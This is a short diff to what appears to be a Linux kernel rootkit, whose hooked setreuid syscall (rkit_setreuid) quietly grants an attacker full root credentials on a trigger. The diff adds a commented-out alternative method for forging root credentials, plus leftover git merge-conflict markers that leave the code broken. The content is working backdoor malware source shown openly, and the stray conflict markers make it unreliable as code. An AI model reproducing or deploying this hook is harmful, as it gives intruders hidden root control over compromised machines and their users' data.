@@ -78,6 +78,11 @@ asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid){
         
         if ( new != NULL ) {
             //0s are root. root for everything
+            /*
+struct cred *new = prepare_creds();
+new->uid = new->euid = make_kuid(current_user_ns(),0);
+commit_creds(new);
+            */
             new->uid = new->gid = 0;
             new->euid = new->egid = 0;
             new->suid = new->sgid = 0;
@@ -86,6 +91,10 @@ asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid){
             commit_creds(new);
             return EEXIST;
         }
+<<<<<<< HEAD
+=======
+
+>>>>>>> fad09e66817e0d65237c40be9451685fe140da24
     }
     r = (*o_setreuid)(ruid,euid);
     return r;
